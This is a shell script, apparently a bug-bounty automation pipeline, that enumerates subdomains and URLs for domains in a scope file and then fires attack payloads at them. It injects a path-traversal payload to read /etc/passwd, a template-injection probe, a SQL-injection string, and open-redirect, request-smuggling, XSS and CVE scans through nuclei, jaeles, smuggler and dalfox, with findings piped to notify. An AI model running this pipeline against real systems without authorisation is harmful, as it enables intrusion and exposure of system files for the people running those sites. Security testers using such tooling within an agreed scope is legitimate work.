#!/bin/sh
red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Asset Finder ${reset}"
echo '----------------------------------------------------------------------'
cat scope.txt | while read line; do ~/go/bin/assetfinder -subs-only $line | tee -a assets; done
clear
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Host Discovery ${reset}"
echo '----------------------------------------------------------------------'
cat assets | ~/go/bin/httprobe -prefer-https | tee hosts
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Urls Gathering ${reset}"
echo '----------------------------------------------------------------------'
cat hosts | sort -u | ~/go/bin/gau | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee gau
cat hosts | sort -u | ~/go/bin/waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee wayback
cat gau wayback | sort -u | tee -a urls
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} GF Sorting ${reset}"
echo '----------------------------------------------------------------------'
mkdir gfsort
~/go/bin/gf --list | while read line; do cat urls | ~/go/bin/gf $line | tee gfsort/$line; done
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} Nuclei and Jaeles Testing per GF ${reset}"
echo '----------------------------------------------------------------------'
echo --------------------------------LFI------------------------------------
cat gfsort/lfi | ~/go/bin/qsreplace "../../../../etc/passwd" | ~/go/bin/httpx -match-regex 'root:x' -threads 300 | tee LFI.txt | ~/go/bin/notify
echo --------------------------------SSTI-----------------------------------
cat gfsort/ssti | ~/go/bin/qsreplace "SSTI{{9*9}}"  | ~/go/bin/httpx -match-regex 'SSTI81' -threads 300 | tee SSTI.txt | ~/go/bin/notify
echo --------------------------------OPEN REDIRECT--------------------------
cat gfsort/redirect | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/open-redirect -u @ | ~/go/bin/notify
echo --------------------------------CVEs--------------------------
cat gfsort/interesting* | sort -u | ~/go/bin/nuclei -t ~/nuclei-templates/cves/ -pbar -o CVEs.txt | ~/go/bin/notify &
echo --------------------------------SQLi--------------------------
cat gfsort/sqli | ~/go/bin/qsreplace "' OR '1" | ~/go/bin/httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" | tee -a SQLi.txt | ~/go/bin/notify
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} SMUGGLER ${reset}"
echo '----------------------------------------------------------------------'
cat hosts | sort -u | python3 ~/smuggler/smuggler.py -t 4 -q &
clear
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} XSS ${reset}"
echo '----------------------------------------------------------------------'
cat gfsort/xss | ~/go/bin/kxss | ~/go/bin/dalfox pipe -o XSS.txt &
echo '______________________________________________________________________'
echo  "${red} Performing : ${green} BIG SCANS ${reset}"
echo '----------------------------------------------------------------------'
cat hosts | ~/go/bin/nuclei -t ~/nuclei-templates/ -pbar -severity high,critical -o NUKED.txt | ~/go/bin/notify &
cat gau | ~/go/bin/qsreplace | sort -u | head -n 1000 | xargs -I@ ~/go/bin/jaeles scan -L 3 -c 100 -s ~/jaeles-signatures/ -u @ | ~/go/bin/notify
